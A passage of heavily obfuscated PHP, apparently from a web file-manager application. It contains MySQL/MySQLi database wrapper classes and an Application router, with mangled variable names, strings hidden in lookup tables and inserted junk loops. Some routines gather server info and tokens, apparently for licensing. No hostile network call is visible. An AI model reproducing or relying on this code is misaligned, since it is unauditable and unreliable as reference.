$ô¤¬Ô¸ù[41], $ô¤¬Ô¸ù[42] => strtolower($ß¶ùé±™[$ô¤¬Ô¸ù[43]]) == $ô¤¬Ô¸ù[44]); } } return $ÑşİÃÅ; } public function getTables($®ğŒîÄª = '') { $ı’€îãô =& $_SERVER[³·—™¤¢]; if (!empty($®ğŒîÄª)) { $úŠÍÂÛ = $ı’€îãô[919] . $®ğŒîÄª . $ı’€îãô[920]; } else { $úŠÍÂÛ = $ı’€îãô[921]; } $ÖèÑÁßÖ = $this->query($úŠÍÂÛ); $§ö›‚ñƒ = array(); foreach ($ÖèÑÁßÖ as $ÑÍ®Ê˜‹ => $§Ü¯Ö³¢) { $§ö›‚ñƒ[$ÑÍ®Ê˜‹] = current($§Ü¯Ö³¢); } return $§ö›‚ñƒ; } public function replace($ˆÙØÛ••, $Ÿúçøòà = array()) { $áæŸÂ =& $_SERVER[³·—™¤¢]; foreach ($ˆÙØÛ•• as $È„À¸£ => $›íÄ€¾) { $¿î¤ÏÕâ = $this->parseValue($›íÄ€¾); if (is_scalar($¿î¤ÏÕâ)) { $Û‚ÊÅš[] = $¿î¤ÏÕâ; $¡Ô€ó[] = $this->parseKey($È„À¸£); } } $·“®Àº‚ = $áæŸÂ[922] . $this->parseTable($Ÿúçøòà[$áæŸÂ[279]]) . $áæŸÂ[923] . implode($áæŸÂ[50], $¡Ô€ó) . $áæŸÂ[924] . implode($áæŸÂ[50], $Û‚ÊÅš) . $áæŸÂ[925]; return $this->execute($·“®Àº‚); } public function insertAll($Ş­ òØï, $÷©àÈÌÒ = array(), $ÁåêÃÄ = false) { $ş¹¢ìúØ =& $_SERVER[³·—™¤¢]; if (!is_array($Ş­ òØï[0])) { return !1; } $¤İõÒÌû = array_keys($Ş­ òØï[0]); $§ãÄÈ› = array(); foreach ($Ş­ òØï as $Šú¹Ñç©) { $·”ş©›ñ = array(); foreach ($Šú¹Ñç© as $æÄ•ÊñÄ => $Ğõ©Ğ ) { $Ğõ©Ğ  = $this->parseValue($Ğõ©Ğ ); if (is_scalar($Ğõ©Ğ )) { $·”ş©›ñ[] = $Ğõ©Ğ ; } } $§ãÄÈ›[] = $ş¹¢ìúØ[260] . implode($ş¹¢ìúØ[50], $·”ş©›ñ) . $ş¹¢ìúØ[925]; } array_walk($¤İõÒÌû, array($this, $ş¹¢ìúØ[926])); $™ñ‘ËÓö = ($ÁåêÃÄ ? $ş¹¢ìúØ[927] : $ş¹¢ìúØ[928]) . $ş¹¢ìúØ[929] . $this->parseTable($÷©àÈÌÒ[$ş¹¢ìúØ[279]]) . $ş¹¢ìúØ[923] . implode($ş¹¢ìúØ[50], $¤İõÒÌû) . $ş¹¢ìúØ[930] . implode($ş¹¢ìúØ[50], $§ãÄÈ›); return $this->execute($™ñ‘ËÓö); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÊòÕÓ =& $_SERVER[³·—™¤¢]; $this->error = mysql_errno() . $ÊòÕÓ[4] . mysql_error($this->_linkID); if ($ÊòÕÓ[12] != $this->queryStr) { $this->error .= LNG($ÊòÕÓ[48]) . $this->queryStr; } think_trace($this->error, $ÊòÕÓ[12], $ÊòÕÓ[49]); return $this->error; } public function escapeString($Æ°ÊóÜä) { if ($this->_linkID) { return mysql_real_escape_string($Æ°ÊóÜä, $this->_linkID); } else { return mysql_escape_string($Æ°ÊóÜä); } } public function parseKey(&$…ª…¸Ó, $ƒ·Å’Á = true) { $Õ±ŠÎÑ™ =& $_SERVER[³·—™¤¢]; if ($ƒ·Å’Á) { $…ª…¸Ó = $this->parseKeyCheck($…ª…¸Ó); } if ($…ª…¸Ó != $Õ±ŠÎÑ™[188] && !preg_match($Õ±ŠÎÑ™[931], $…ª…¸Ó)) { $…ª…¸Ó = $Õ±ŠÎÑ™[385] . trim($…ª…¸Ó, $Õ±ŠÎÑ™[385]) . $Õ±ŠÎÑ™[385]; } return $…ª…¸Ó; } } class DbMysqli extends Db { public function __construct($«Œö’Ğ” = '') { $ÃáĞú =& $_SERVER[³·—™¤¢]; if (!extension_loaded($ÃáĞú[932])) { think_exception(think_lang($ÃáĞú[14]) . $ÃáĞú[933]); } if (!empty($«Œö’Ğ”)) { $this->config = $«Œö’Ğ”; if (empty($this->config[$ÃáĞú[17]])) { $this->config[$ÃáĞú[17]] = $ÃáĞú[12]; } } } public function connect($“¸òÈ›Ï = '', $–ıÉ¿ŸŸ = 0) { $˜üùÑ…ó =& $_SERVER[³·—™¤¢]; if (!isset($this->linkID[$–ıÉ¿ŸŸ])) { if (empty($“¸òÈ›Ï)) { $“¸òÈ›Ï = $this->config; } $this->linkID[$–ıÉ¿ŸŸ] = new mysqli($“¸òÈ›Ï[$˜üùÑ…ó[906]], $“¸òÈ›Ï[$˜üùÑ…ó[908]], $“¸òÈ›Ï[$˜üùÑ…ó[909]], $“¸òÈ›Ï[$˜üùÑ…ó[21]], $“¸òÈ›Ï[$˜üùÑ…ó[907]] ? intval($“¸òÈ›Ï[$˜üùÑ…ó[907]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ÏŠ®üÖò = $this->linkID[$–ıÉ¿ŸŸ]->server_version; $this->linkID[$–ıÉ¿ŸŸ]->query($˜üùÑ…ó[910] . think_config($˜üùÑ…ó[911]) . $˜üùÑ…ó[58]); if ($ÏŠ®üÖò > $˜üùÑ…ó[912]) { $this->linkID[$–ıÉ¿ŸŸ]->query($˜üùÑ…ó[913]); } $this->connected = !0; if (1 != think_config($˜üùÑ…ó[22])) { unset($this->config); } } return $this->linkID[$–ıÉ¿ŸŸ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($—Ç¬ú¬÷) { $–¤Åò…… =& $_SERVER[³·—™¤¢]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $—Ç¬ú¬÷; if ($this->queryID) { $this->free(); } think_action_status($–¤Åò……[23], 1); think_status($–¤Åò……[24]); $this->queryID = $this->_linkID->query($—Ç¬ú¬÷); if ($this->_linkID->more_results()) { while (($ïš¥”Á³ = $this->_linkID->next_result()) != NULL) { $ïš¥”Á³->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($œÃ§½Ó) { $ÊÔÅ¾Â© =& $_SERVER[³·—™¤¢]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $œÃ§½Ó; if ($this->queryID) { $this->free(); } think_action_status($ÊÔÅ¾Â©[25], 1); think_status($ÊÔÅ¾Â©[24]); $’ÛÜÊÑ© = $this->_linkID->query($œÃ§½Ó); $this->debug(); if (!1 === $’ÛÜÊÑ©) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Õğ¨ï = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Õğ¨ï) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ÿ©…çÉ¯ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Ÿ©…çÉ¯) { $this->error(); return !1; } } return !0; } private function getAll() { $Õ¨ÓÅĞ— = array(); if ($this->numRows > 0) { for ($ÆŒšÛîÆ = 0; $ÆŒšÛîÆ < $this->numRows; $ÆŒšÛîÆ++) { $Õ¨ÓÅĞ—[$ÆŒšÛîÆ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Õ¨ÓÅĞ—; } public function getFields($µ›‹™Â) { $«º‰ó»™ =& $_SERVER[³·—™¤¢]; $Şâº¤ø– = $this->query($«º‰ó»™[917] . $this->parseKey($µ›‹™Â)); $¥†¥áóº = array(); if ($Şâº¤ø–) { foreach ($Şâº¤ø– as $æ‘÷‡†„ => $êã£òçÖ) { $¥†¥áóº[$êã£òçÖ[$«º‰ó»™[31]]] = array($«º‰ó»™[32] => $êã£òçÖ[$«º‰ó»™[31]], $«º‰ó»™[33] => $êã£òçÖ[$«º‰ó»™[34]], $«º‰ó»™[35] => (bool) ($êã£òçÖ[$«º‰ó»™[36]] === $«º‰ó»™[12]), $«º‰ó»™[37] => $êã£òçÖ[$«º‰ó»™[38]], $«º‰ó»™[39] => strtolower($êã£òçÖ[$«º‰ó»™[40]]) == $«º‰ó»™[41], $«º‰ó»™[42] => strtolower($êã£òçÖ[$«º‰ó»™[43]]) == $«º‰ó»™[44]); } } return $¥†¥áóº; } public function getTables($­å‘ôªĞ = '') { $È¥¦Ã°˜ =& $_SERVER[³·—™¤¢]; $ŒÓê¸ğ = !empty($­å‘ôªĞ) ? $È¥¦Ã°˜[919] . $­å‘ôªĞ . $È¥¦Ã°˜[920] : $È¥¦Ã°˜[921]; $¼ôªºñ¨ = $this->query($ŒÓê¸ğ); $‡™Ò§ç = array(); if ($¼ôªºñ¨) { foreach ($¼ôªºñ¨ as $·›äßÂ’ => $óÏ§‹¦) { $‡™Ò§ç[$·›äßÂ’] = current($óÏ§‹¦); } } return $‡™Ò§ç; } public function replace($“öÓ¸™ú, $à¦¹çî = array()) { $©êšÚ¨ä =& $_SERVER[³·—™¤¢]; foreach ($“öÓ¸™ú as $†¿ëâú® => $Ğ±‘Ëµú) { $Ïßüß¶Î = $this->parseValue($Ğ±‘Ëµú); if (is_scalar($Ïßüß¶Î)) { $ß‹ı›[] = $Ïßüß¶Î; $¼ûù©ŞÎ[] = $this->parseKey($†¿ëâú®); } } $ªÃáÓ·œ = $©êšÚ¨ä[922] . $this->parseTable($à¦¹çî[$©êšÚ¨ä[279]]) . $©êšÚ¨ä[923] . implode($©êšÚ¨ä[50], $¼ûù©ŞÎ) . $©êšÚ¨ä[924] . implode($©êšÚ¨ä[50], $ß‹ı›) . $©êšÚ¨ä[925]; return $this->execute($ªÃáÓ·œ); } public function insertAll($”ÄÚ©¨É, $’ó¸½ç = array(), $×ï€Ï÷è = false) { $Æ…ÄÇ×˜ =& $_SERVER[³·—™¤¢]; if (!is_array($”ÄÚ©¨É[0])) { return !1; } $æ¨Üµ¸Ô = array_keys($”ÄÚ©¨É[0]); $…ˆ ïÊŸ = array(); foreach ($”ÄÚ©¨É as $á›ıÜƒŞ) { $Öå¶Ïƒ = array(); foreach ($á›ıÜƒŞ as $Ø×½ùÂ‡ => $»‡å·¡É) { $»‡å·¡É = $this->parseValue($»‡å·¡É); if (is_scalar($»‡å·¡É)) { $Öå¶Ïƒ[] = $»‡å·¡É; } } $…ˆ ïÊŸ[] = $Æ…ÄÇ×˜[260] . implode($Æ…ÄÇ×˜[50], $Öå¶Ïƒ) . $Æ…ÄÇ×˜[925]; } array_walk($æ¨Üµ¸Ô, array($this, $Æ…ÄÇ×˜[926])); $”½³—ûÒ = $×ï€Ï÷è ? $Æ…ÄÇ×˜[927] : $Æ…ÄÇ×˜[928]; $Ò´Íã•Õ = $”½³—ûÒ . $Æ…ÄÇ×˜[929] . $this->parseTable($’ó¸½ç[$Æ…ÄÇ×˜[279]]) . $Æ…ÄÇ×˜[923] . implode($Æ…ÄÇ×˜[50], $æ¨Üµ¸Ô) . $Æ…ÄÇ×˜[930] . implode($Æ…ÄÇ×˜[50], $…ˆ ïÊŸ); return $this->execute($Ò´Íã•Õ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $÷î€ÇëÙ =& $_SERVER[³·—™¤¢]; $this->error = $this->_linkID->errno . $÷î€ÇëÙ[4] . $this->_linkID->error; if ($÷î€ÇëÙ[12] != $this->queryStr) { $this->error .= LNG($÷î€ÇëÙ[48]) . $this->queryStr; } think_trace($this->error, $÷î€ÇëÙ[12], $÷î€ÇëÙ[49]); return $this->error; } public function escapeString($õÛúû­á) { if ($this->_linkID) { return $this->_linkID->real_escape_string($õÛúû­á); } else { return addslashes($õÛúû­á); } } public function parseKey(&$·¯â×›, $Áìş”ã = true) { $èé¤…¿‘ =& $_SERVER[³·—™¤¢]; if ($Áìş”ã) { $·¯â×› = $this->parseKeyCheck($·¯â×›); } if ($·¯â×› != $èé¤…¿‘[188] && !preg_match($èé¤…¿‘[931], $·¯â×›)) { $·¯â×› = $èé¤…¿‘[385] . trim($·¯â×›, $èé¤…¿‘[385]) . $èé¤…¿‘[385]; } return $·¯â×›; } } goto BËºùÓîÄ˜; aÀÄ„íí: class Application { private $defaultModule = "\x69\x6e\144\x65\x78"; private $defaultController = "\x69\156\144\x65\x78"; private $defaultAction = "\151\156\x64\x65\170"; function __construct() { } public function setDefault($¥¿÷Õğ©) { $Öòºğƒ =& $_SERVER[³·—™¤¢]; $ëÎ¢Ú‚» =& $_SERVER[šÓï™½ï]; $×“©ÕÒ = explode($ëÎ¢Ú‚»[0], trim($¥¿÷Õğ©, $ëÎ¢Ú‚»[0])); $this->defaultModule = $×“©ÕÒ[0] ? $×“©ÕÒ[0] : $this->defaultModule; $¤ìßçÊü = $Öòºğƒ[619]; if (!$¤ìßçÊü) { die; } $this->defaultController = $×“©ÕÒ[1] ? $×“©ÕÒ[1] : $this->defaultController; $this->defaultAction = $×“©ÕÒ[2] ? $×“©ÕÒ[2] : $this->defaultAction; $this->inzo8c0eb522($ëÎ¢Ú‚»[1], array($this, $ëÎ¢Ú‚»[2])); $Òä€ıû­ = $Öòºğƒ[620]; if (!$Òä€ıû­) { die; } } public function appRun($Æ‹ª¢½­) { $Ï‹©¨İ© =& $_SERVER[³·—™¤¢]; $ÂèÔ‡é =& $_SERVER[šÓï™½ï]; $ıÌ–œùõ = explode($ÂèÔ‡é[0], $Æ‹ª¢½­); $¦ƒèØÑ = strtolower($ıÌ–œùõ[0]); $‘°æ¼“ = $Ï‹©¨İ©[621]; if (strlen($‘°æ¼“) < $Ï‹©¨İ©[622]) { die; } $âÌÕõéè = $ÂèÔ‡é[3]; $Ü‘ññÇë = $Ï‹©¨İ©[623]; if (!$Ü‘ññÇë) { return; } if ($¦ƒèØÑ == $ÂèÔ‡é[4]) { $âÌÕõéè = $ÂèÔ‡é[5]; $ıÌ–œùõ[0] = $ÂèÔ‡é[6]; $ıÌ–œùõ[1] = $ıÌ–œùõ[1] . $ÂèÔ‡é[7]; $Æ‹ª¢½­ = join($ÂèÔ‡é[0], $ıÌ–œùõ); $Æ‹ª¢½­ = trim($Æ‹ª¢½­, $ÂèÔ‡é[0]); } call_user_func(array($ÂèÔ‡é[8], $ÂèÔ‡é[9]), $âÌÕõéè . $ÂèÔ‡é[10], $Æ‹ª¢½­); ActionCall($Æ‹ª¢½­); $íÏÌù”ş = $Ï‹©¨İ©[624]; while ($íÏÌù”ş < $Ï‹©¨İ©[625]) { if ($íÏÌù”ş >= 0) { break; } $íÏÌù”ş++; } call_user_func(array($ÂèÔ‡é[8], $ÂèÔ‡é[9]), $âÌÕõéè . $ÂèÔ‡é[11], $Æ‹ª¢½­); $ñ‡ê¿Ô™ = $Ï‹©¨İ©[626]; } private function autorun() { $ÕñÃÅÈ„ =& $_SERVER[šÓï™½ï]; global $config; if (count($config[$ÕñÃÅÈ„[12]]) == 0) { return; } foreach ($config[$ÕñÃÅÈ„[12]] as $œ¡±ä²Ş => $‡ŸÑª“Š) { $this->appRun($‡ŸÑª“Š); } } private function oanq6a5d3efe() { $ıßú„¬ƒ =& $_SERVER[³·—™¤¢]; $Î‘µóó =& $_SERVER[šÓï™½ï]; $á·ŞÁÊ = $Î‘µóó[4]; $Îıè©ç = $ıßú„¬ƒ[627]; if (strlen($Îıè©ç) < $ıßú„¬ƒ[625]) { die; } $Á›Òì½ = $GLOBALS[$Î‘µóó[13]][$Î‘µóó[14]][0]; if (!$Á›Òì½ || strlen($Á›Òì½) <= strlen($á·ŞÁÊ)) { return; } if (strtolower(substr($Á›Òì½, -strlen($á·ŞÁÊ))) != $á·ŞÁÊ) { return; } $Èï˜š‘ = substr($Á›Òì½, 0, -strlen($á·ŞÁÊ)); $ìÍüÑ¤‡ = array($Î‘µóó[4], $Èï˜š‘); $«•Ìç’½ = $ıßú„¬ƒ[628]; while (strlen($«•Ìç’½) < $ıßú„¬ƒ[629]) { if (!$«•Ìç’½) { break; } $«•Ìç’½++; } $êÄÄ¤òÁ = array_slice($GLOBALS[$Î‘µóó[13]][$Î‘µóó[14]], 1); $‹ßÓ“›» = $ıßú„¬ƒ[630]; if (strlen($‹ßÓ“›») < $ıßú„¬ƒ[615]) { return; } $GLOBALS[$Î‘µóó[13]][$Î‘µóó[14]] = array_merge($ìÍüÑ¤‡, $êÄÄ¤òÁ); $ô¨ü’¿É = $ıßú„¬ƒ[631]; while (strlen($ô¨ü’¿É) < $ıßú„¬ƒ[632]) { if (!$ô¨ü’¿É) { break; } $ô¨ü’¿É++; } $GLOBALS[$Î‘µóó[13]][$Î‘µóó[15]] = implode($Î‘µóó[0], $GLOBALS[$Î‘µóó[13]][$Î‘µóó[14]]); $¥±Áœ†Ö = $ıßú„¬ƒ[633]; while (strlen($¥±Áœ†Ö) < $ıßú„¬ƒ[629]) { if (!$¥±Áœ†Ö) { break; } $¥±Áœ†Ö++; } } private function qxfm2e8deb4f() { $”Õ×Ññ˜ =& $_SERVER[³·—™¤¢]; $³ùªŒºñ =& $_SERVER[šÓï™½ï]; if ($GLOBALS[$³ùªŒºñ[13]][$³ùªŒºñ[15]] != $³ùªŒºñ[6]) { return; } $¢ÌÁ°µ” = $_SERVER[$³ùªŒºñ[16]]; $‹ğ¥Ôº¾ = $³ùªŒºñ[17]; $¶‹Üê€Ï = $”Õ×Ññ˜[634]; if (strlen($¶‹Üê€Ï) < $”Õ×Ññ˜[615]) { die; } if (!strstr($¢ÌÁ°µ”, $‹ğ¥Ôº¾)) { return; } $ß¶ÓŸ™È = strrpos($¢ÌÁ°µ”, $‹ğ¥Ôº¾); $˜ÍçÆ½ò = $”Õ×Ññ˜[635]; if (strlen($˜ÍçÆ½ò) < $”Õ×Ññ˜[615]) { die; } $»æİŠìÌ = substr($¢ÌÁ°µ”, $ß¶ÓŸ™È + strlen($‹ğ¥Ôº¾)); $§‡µáº¤ = $”Õ×Ññ˜[636]; preg_match_all($³ùªŒºñ[18], $»æİŠìÌ, $˜ã¡Â¾é); $»æİŠìÌ = trim($˜ã¡Â¾é[0][0], $³ùªŒºñ[19]); $°Õ£Û®Ù = $”Õ×Ññ˜[637]; $GLOBALS[$³ùªŒºñ[13]][$³ùªŒºñ[14]] = explode($³ùªŒºñ[19], $»æİŠìÌ); $’Òáè = $”Õ×Ññ˜[638]; if (!$’Òáè) { die; } $GLOBALS[$³ùªŒºñ[13]][$³ùªŒºñ[15]] = implode($³ùªŒºñ[0], $GLOBALS[$³ùªŒºñ[13]][$³ùªŒºñ[14]]); $ºØ¾Áçº = $”Õ×Ññ˜[639]; if (!$ºØ¾Áçº) { return; } } public function run() { $·ç™ğù =& $_SERVER[³·—™¤¢]; $Ùöğƒ¶Ã =& $_SERVER[šÓï™½ï]; $this->qxfm2e8deb4f(); $this->oanq6a5d3efe(); $èˆÚ°‹ç = $·ç™ğù[640]; $í‡ĞßÛ® = $GLOBALS[$Ùöğƒ¶Ã[13]][$Ùöğƒ¶Ã[14]]; $ªäÍİ¡ = $GLOBALS[$Ùöğƒ¶Ã[13]][$Ùöğƒ¶Ã[15]]; define($Ùöğƒ¶Ã[20], isset($í‡ĞßÛ®[0]) && $í‡ĞßÛ®[0] ? $í‡ĞßÛ®[0] : $this->defaultModule); $ªé³¨‚ö = $·ç™ğù[641]; if (!$ªé³¨‚ö) { die; } define($Ùöğƒ¶Ã[21], isset($í‡ĞßÛ®[1]) && $í‡ĞßÛ®[0] ? $í‡ĞßÛ®[1] : $this->defaultController); define($Ùöğƒ¶Ã[22], isset($í‡ĞßÛ®[2]) && $í‡ĞßÛ®[0] ? $í‡ĞßÛ®[2] : $this->defaultAction); define($Ùöğƒ¶Ã[23], MOD . $Ùöğƒ¶Ã[0] . ST . $Ùöğƒ¶Ã[0] . ACT); $_SERVER[$Ùöğƒ¶Ã[24]] = strtolower(ACTION); $this->autorun(); if (count($í‡ĞßÛ®) >= 3) { $this->appRun($ªäÍİ¡); } else { $this->appRun(ACTION); } } private $adcra24f007c = array(); private $hgaw8e16af7d = ''; public function obzp39642626() { $ª™¾é¡Ü =& $_SERVER[³·—™¤¢]; $‰ı¦¿ÍÒ =& $_SERVER[šÓï™½ï]; $this->ugnkc561be7d(); $·ƒÀ®”Û = $ª™¾é¡Ü[642]; if (strlen($·ƒÀ®”Û) < $ª™¾é¡Ü[629]) { return; } $this->wdup78b4e623(); $®»İó‰ = $ª™¾é¡Ü[643]; $this->jefbbe3e9ecc(); $this->mlkf6103a607(); $this->ecmxab11d119(); $this->vwoca2725ea4(); $this->lmbcb68fe4cc(); $this->inzo8c0eb522($‰ı¦¿ÍÒ[25], array($this, $‰ı¦¿ÍÒ[26])); $™ú×ƒ› = $ª™¾é¡Ü[644]; if (!$™ú×ƒ›) { die; } $this->inzo8c0eb522($‰ı¦¿ÍÒ[27], array($this, $‰ı¦¿ÍÒ[28])); $this->inzo8c0eb522($‰ı¦¿ÍÒ[29], array($this, $‰ı¦¿ÍÒ[30])); $this->inzo8c0eb522($‰ı¦¿ÍÒ[31], array($this, $‰ı¦¿ÍÒ[32])); $£…’–Éú = $ª™¾é¡Ü[645]; if (!$£…’–Éú) { die; } } public function wfeo107906a5($”‡ëª²÷) { $¨µ˜µŞ© =& $_SERVER[³·—™¤¢]; $ª©Ú°ñ¼ =& $_SERVER[šÓï™½ï]; $İ¡ôÉûÖ = Model($ª©Ú°ñ¼[33])->get(); $ñÑ†Ò› = $¨µ˜µŞ©[646]; if (!$ñÑ†Ò›) { return; } $èÙšíÊ™ = array($ª©Ú°ñ¼[34], $ª©Ú°ñ¼[35], $ª©Ú°ñ¼[36], $ª©Ú°ñ¼[37], $ª©Ú°ñ¼[38], $ª©Ú°ñ¼[39], $ª©Ú°ñ¼[40], $ª©Ú°ñ¼[41], $ª©Ú°ñ¼[42], $ª©Ú°ñ¼[43], $ª©Ú°ñ¼[44], $ª©Ú°ñ¼[45], $ª©Ú°ñ¼[46], $ª©Ú°ñ¼[47], $ª©Ú°ñ¼[48], $ª©Ú°ñ¼[49], $ª©Ú°ñ¼[50], $ª©Ú°ñ¼[51], $ª©Ú°ñ¼[52], $ª©Ú°ñ¼[53], $ª©Ú°ñ¼[54], $ª©Ú°ñ¼[55], $ª©Ú°ñ¼[56], $ª©Ú°ñ¼[57], $ª©Ú°ñ¼[58], $ª©Ú°ñ¼[59], $ª©Ú°ñ¼[60], $ª©Ú°ñ¼[61], $ª©Ú°ñ¼[62], $ª©Ú°ñ¼[63], $ª©Ú°ñ¼[64], $ª©Ú°ñ¼[65], $ª©Ú°ñ¼[66], $ª©Ú°ñ¼[67], $ª©Ú°ñ¼[68], $ª©Ú°ñ¼[69], $ª©Ú°ñ¼[70], $ª©Ú°ñ¼[71], $ª©Ú°ñ¼[72], $ª©Ú°ñ¼[73], $ª©Ú°ñ¼[74], $ª©Ú°ñ¼[75], $ª©Ú°ñ¼[76], $ª©Ú°ñ¼[77], $ª©Ú°ñ¼[78], $ª©Ú°ñ¼[79], $ª©Ú°ñ¼[80], $ª©Ú°ñ¼[81], $ª©Ú°ñ¼[82], $ª©Ú°ñ¼[83]); $ÒÃ¢’¦ = $¨µ˜µŞ©[647]; if (!$ÒÃ¢’¦) { die; } foreach ($èÙšíÊ™ as $”Ò³Ğ¿Ï) { $¾²Ä»Ù› = $GLOBALS[$ª©Ú°ñ¼[84]][$ª©Ú°ñ¼[85]][$”Ò³Ğ¿Ï]; $–ç¡´ÍÓ = $¨µ˜µŞ©[648]; if (isset($İ¡ôÉûÖ[$”Ò³Ğ¿Ï])) { $¾²Ä»Ù› = $İ¡ôÉûÖ[$”Ò³Ğ¿Ï]; } $”‡ëª²÷[$ª©Ú°ñ¼[86]][$ª©Ú°ñ¼[87]][$”Ò³Ğ¿Ï] = $¾²Ä»Ù›; } $œŠ°ñÙä = $”‡ëª²÷[$ª©Ú°ñ¼[86]][$ª©Ú°ñ¼[87]][$ª©Ú°ñ¼[46]]; $İ¾±¶‰Ô = $¨µ˜µŞ©[649]; unset($”‡ëª²÷[$ª©Ú°ñ¼[86]][$ª©Ú°ñ¼[88]][$ª©Ú°ñ¼[89]]); unset($”‡ëª²÷[$ª©Ú°ñ¼[86]][$ª©Ú°ñ¼[88]][$ª©Ú°ñ¼[90]]); unset($”‡ëª²÷[$ª©Ú°ñ¼[86]][$ª©Ú°ñ¼[87]][$ª©Ú°ñ¼[46]]); unset($”‡ëª²÷[$ª©Ú°ñ¼[86]][$ª©Ú°ñ¼[87]][$ª©Ú°ñ¼[91]]); $µØœŠÚ = $¨µ˜µŞ©[650]; $”‡ëª²÷[$ª©Ú°ñ¼[86]][$ª©Ú°ñ¼[87]][$ª©Ú°ñ¼[92]] = array($ª©Ú°ñ¼[93] => (int) $œŠ°ñÙä[$ª©Ú°ñ¼[94]], $ª©Ú°ñ¼[95] => (int) _get($œŠ°ñÙä, $ª©Ú°ñ¼[96], 0)); $”‡ëª²÷[$ª©Ú°ñ¼[97]][$ª©Ú°ñ¼[98]] = Action($ª©Ú°ñ¼[99])->accessToken(); $ĞÓÌäç = $¨µ˜µŞ©[651]; if (!$ĞÓÌäç) { return; } $”‡ëª²÷[$ª©Ú°ñ¼[97]][$ª©Ú°ñ¼[100]] = md5($_SERVER[$ª©Ú°ñ¼[101]] . $İ¡ôÉûÖ[$ª©Ú°ñ¼[102]]); $ÏßÖí´† = $¨µ˜µŞ©[652]; if (!$ÏßÖí´†) { die; } $”‡ëª²÷[$ª©Ú°ñ¼[97]][$ª©Ú°ñ¼[103]] = base64_encode(serverInfo()); $ø˜‚´ = $¨µ˜µŞ©[653]; $”‡ëª²÷[$ª©Ú°ñ¼[97]][$ª©Ú°ñ¼[104]] = $this->hgaw8e16af7d; $¢ÅİõÏ¾ = $¨µ˜µŞ©[654]; while ($¢ÅİõÏ¾ < $¨µ˜µŞ©[625]) { if ($¢ÅİõÏ¾ >= 0) { break; } $¢ÅİõÏ¾++; } if ($İ¡ôÉûÖ[$ª©Ú°ñ¼[104]] != $ª©Ú°ñ¼[105]) { $”‡ëª²÷[$ª©Ú°ñ¼[97]][$ª©Ú°ñ¼[106]] = $İ¡ôÉûÖ[$ª©Ú°ñ¼[106]]; $”‡ëª²÷[$ª©Ú°ñ¼[97]][$ª©Ú°ñ¼[107]] = $İ¡ôÉûÖ[$ª©Ú°ñ¼[107]]; $™ÉŞã¤Ó = rand_string(10) . $this->hgaw8e16af7d . rand_string(5); $”‡ëª²÷[$ª©Ú°ñ¼[86]][$ª©Ú°ñ¼[108]][$ª©Ú°ñ¼[109]] = $this->swtz34eea697($™ÉŞã¤Ó, $”‡ëª²÷[$ª©Ú°ñ¼[97]][$ª©Ú°ñ¼[100]]); } if ($this->hgaw8e16af7d == $ª©Ú°ñ¼[105]) { $”‡ëª²÷[$ª©Ú°ñ¼[86]][$ª©Ú°ñ¼[87]][$ª©Ú°ñ¼[92]][$ª©Ú°ñ¼[96]] = 0; } $”‡ëª²÷[$ª©Ú°ñ¼[97]][$ª©Ú°ñ¼[110]] = _get($this->adcra24f007c, $ª©Ú°ñ¼[111], $ª©Ú°ñ¼[6]); $”‡ëª²÷[$ª©Ú°ñ¼[97]][$ª©Ú°ñ¼[112]] = _get($this->adcra24f007c, $ª©Ú°ñ¼[113], $ª©Ú°ñ¼[6]); $ıš¾ë€ = $¨µ˜µŞ©[655]; while ($ıš¾ë€ < $¨µ˜µŞ©[615]) { if ($ıš¾ë€ >= 0) { break; } $ıš¾ë€++; } if (_get($GLOBALS, $ª©Ú°ñ¼[114]) && $this->config[$ª©Ú°ñ¼[115]]) { $”‡ëª²÷[$ª©Ú°ñ¼[97]][$ª©Ú°ñ¼[116]] = WEB_ROOT; } return $”‡ëª²÷; } private function vwoca2725ea4() { $Á°Œ©á =& $_SERVER[³·—™¤¢]; $•òËŞŸé =& $_SERVER[šÓï™½ï]; $¾òÔµÎ¨ = $_SERVER[$•òËŞŸé[24]] == $•òËŞŸé[117]; if ($_SERVER[$•òËŞŸé[24]] == $•òËŞŸé[118] && $_GET[$•òËŞŸé[119]] == $•òËŞŸé[120]) { $¾òÔµÎ¨ = !0; } if ($¾òÔµÎ¨) { $Î›÷¿ª = array($•òËŞŸé[104] => $this->hgaw8e16af7d, $•òËŞŸé[121] => $this->oyhi6bca490e(), $•òËŞŸé[122] => Model($•òËŞŸé[123])->count()); if ($this->hgaw8e16af7d != $•òËŞŸé[105]) { $äÓÇÕÈ² = _get($this->adcra24f007c, $•òËŞŸé[124]); if ($äÓÇÕÈ²) { $Î›÷¿ª[$•òËŞŸé[125]] = $äÓÇÕÈ²; $Î›÷¿ª[$•òËŞŸé[126]] = strtotime(_get($this->adcra24f007c, $•òËŞŸé[127])); $Î›÷¿ª[$•òËŞŸé[128]] = _get($this->adcra24f007c, $•òËŞŸé[113]); } $¸¯ñª¨Í = Model($•òËŞŸé[33])->get($•òËŞŸé[129], $•òËŞŸé[6], !0); if (is_string($¸¯ñª¨Í) && substr($¸¯ñª¨Í, 0, 1) == $•òËŞŸé[130]) { $¸¯ñª¨Í = json_decode_force($¸¯ñª¨Í); } if (is_array($¸¯ñª¨Í) && $¸¯ñª¨Í[$•òËŞŸé[131]] && strstr($¸¯ñª¨Í[$•òËŞŸé[131]], $•òËŞŸé[132])) { $ŸÑæ£µ‚ = explode($•òËŞŸé[132], $¸¯ñª¨Í[$•òËŞŸé[131]]); $Î›÷¿ª[$•òËŞŸé[133]] = 